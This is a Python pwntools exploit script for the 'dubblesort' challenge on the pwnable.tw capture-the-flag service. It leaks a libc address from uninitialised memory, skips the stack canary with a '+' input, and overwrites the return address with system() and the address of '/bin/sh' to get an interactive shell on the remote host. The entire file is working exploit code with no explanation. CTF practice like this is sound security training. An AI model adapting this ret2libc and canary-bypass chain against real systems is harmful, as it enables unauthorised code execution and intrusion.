from pwn import *

debug = False

if (debug):
    io = process('./dubblesort')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    offset = 0x001eb000
else:
    io = remote('chall.pwnable.tw', 10101)
    libc = ELF('libc_32.so.6')
    offset = 0x001b0000

print(io.recv())
if (debug):
    io.sendline(b'aaaaaaaa')
    print('trash: ', io.recv(14))
else:
    io.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaa')
    print('trash: ', io.recv(30))
info = io.recv(4)
print('raw: ', info)
virtual_libc = u32(info)-0xa
print('leaked: ', hex(virtual_libc))
print('trash: ', io.recv())
libc.address = virtual_libc - offset
print('base libc addr: ', hex(libc.address))
print('system: ', hex(libc.sym['system']))
print('bin/sh: ', hex(next(libc.search(b'/bin/sh'))))
io.sendline(b'35')
for i in range(24):
    print(io.recv())
    io.sendline(b'0')
print(io.recv())
io.sendline(b'+')


for i in range(32-25):
    print(io.recv())
    io.sendline(str(libc.sym['system']))

print(io.recv())
print('New RIP value: ', libc.sym['system'])
io.sendline(str(libc.sym['system']))

print(io.recv())
print('Sending /bin/sh: ', next(libc.search(b'/bin/sh')))
io.sendline(str(next(libc.search(b'/bin/sh'))))
print(io.recv())
print('Sending /bin/sh: ', next(libc.search(b'/bin/sh')))
io.sendline(str(next(libc.search(b'/bin/sh'))))

print(io.recv())
io.interactive()
